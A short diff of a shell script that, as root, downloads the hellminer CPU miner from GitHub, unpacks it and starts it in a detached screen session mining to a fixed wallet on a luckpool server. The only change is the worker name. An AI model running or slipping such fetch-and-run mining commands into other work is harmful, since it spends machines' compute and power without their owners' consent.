@@ -2,4 +2,4 @@
 cd /root
 sudo wget -P /root https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
 sudo tar -xvf /root/hellminer_cpu_linux.tar.gz
-sudo screen -dmS vrsk /root/./hellminer -c stratum+tcp://eu.luckpool.net:3956 -u RXDPCKWcL75zQ2zjkmb4x723NQZkJNQdxW.hailsrnkoeingzs5@hotmai -p x --cpu 2
+sudo screen -dmS vrsk /root/./hellminer -c stratum+tcp://eu.luckpool.net:3956 -u RXDPCKWcL75zQ2zjkmb4x723NQZkJNQdxW.artessolento@Outlook -p x --cpu 2
